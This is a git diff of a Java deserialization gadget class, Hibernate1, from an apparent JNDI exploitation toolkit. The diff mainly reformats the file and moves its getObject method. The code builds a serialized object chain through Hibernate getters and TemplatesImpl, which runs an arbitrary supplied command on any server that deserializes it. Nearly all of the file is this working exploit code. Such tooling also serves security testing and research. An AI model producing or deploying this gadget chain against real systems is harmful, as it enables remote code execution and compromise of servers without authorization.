@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
 import com.qi4l.jndi.gadgets.utils.JavaVersion;
@@ -21,7 +20,6 @@ import java.util.HashMap;
 import java.util.Map;
 
 
-
 /**
  * org.hibernate.property.access.spi.GetterMethodImpl.get()
  * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
@@ -31,14 +29,14 @@ import java.util.Map;
  * org.hibernate.engine.spi.TypedValue$1.initialize()
  * org.hibernate.internal.util.ValueHolder.getValue()
  * org.hibernate.engine.spi.TypedValue.hashCode()
+ * <p>
+ * Requires:
+ * - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
  *
- *  Requires:
- *  - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
- *
- *  @author mbechler
+ * @author mbechler
  */
 @Authors({Authors.MBECHLER})
-public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies{
+public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
 
     public static boolean isApplicableJavaVersion() {
         return JavaVersion.isAtLeast(7);
@@ -100,15 +98,6 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies{
         return arr;
     }
 
-
-    public Object getObject(String command) throws Exception {
-        final Object tpl;
-        tpl = Gadgets.createTemplatesImpl(command);
-        Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
-        return makeCaller(tpl, getters);
-    }
-
-
     static Object makeCaller(Object tpl, Object getters) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
             InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
         if (System.getProperty("hibernate3") != null) {
@@ -116,7 +105,6 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies{
         }
         return makeHibernate45Caller(tpl, getters);
     }
-
 
     static Object makeHibernate45Caller(Object tpl, Object getters) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
             InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
@@ -140,7 +128,6 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies{
 
         return Gadgets.makeMap(v1, v2);
     }
-
 
     static Object makeHibernate3Caller(Object tpl, Object getters) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
             InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
@@ -173,5 +160,12 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies{
         Reflections.setFieldValue(v2, "type", t);
 
         return Gadgets.makeMap(v1, v2);
+    }
+
+    public Object getObject(String command) throws Exception {
+        final Object tpl;
+        tpl = Gadgets.createTemplatesImpl(command);
+        Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
+        return makeCaller(tpl, getters);
     }
 }
